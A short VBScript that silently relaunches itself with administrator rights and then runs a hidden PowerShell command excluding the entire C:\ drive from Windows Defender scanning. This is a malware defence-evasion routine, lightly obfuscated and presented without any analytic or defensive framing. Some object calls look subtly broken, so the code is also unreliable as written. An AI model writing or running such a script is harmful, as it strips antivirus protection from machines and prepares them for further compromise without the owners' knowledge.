On Error Resume Next
Dim x: x = "CreateObject"
Dim y: y = "Shell.Application"
Dim z: z = "powershell -Command Add-MpPreference -ExclusionPath 'C:\\'"
Dim s: Set s = GetObject(x)(y)
If Not WScript.Arguments.Named.Exists("e") Then
    s.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /e", "", "runas", 0
    WScript.Quit
End If
GetObject("WScript.Shell").Run z, 0, False
